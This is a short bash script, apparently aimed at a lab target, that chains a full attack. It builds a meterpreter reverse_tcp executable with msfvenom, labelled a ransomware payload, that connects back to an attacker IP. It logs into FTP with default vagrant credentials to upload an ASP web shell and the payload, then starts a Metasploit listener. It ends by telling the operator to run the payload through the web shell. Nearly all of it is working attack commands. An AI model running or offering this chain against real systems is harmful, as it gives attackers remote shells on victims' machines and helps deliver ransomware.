#!/bin/bash

VICTIM_IP="<VICTIM_IP>"
ATTACKER_IP="<YOUR_KALI_IP>"
PAYLOAD="ransom101.exe"

# Step 1: Generate ransomware payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o $PAYLOAD

# Step 2: Upload via FTP backdoor
ftp -n $VICTIM_IP <<EOF
user vagrant vagrant
bin
put aspcmd.asp
put $PAYLOAD
bye
EOF

# Step 3: Start Metasploit listener
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $ATTACKER_IP; set LPORT 4444; run"

# Step 4: Execute (manual step - open browser to http://<VICTIM_IP>/aspcmd.asp)
echo "Now open http://$VICTIM_IP/aspcmd.asp and run: C:\inetpub\wwwroot\$PAYLOAD"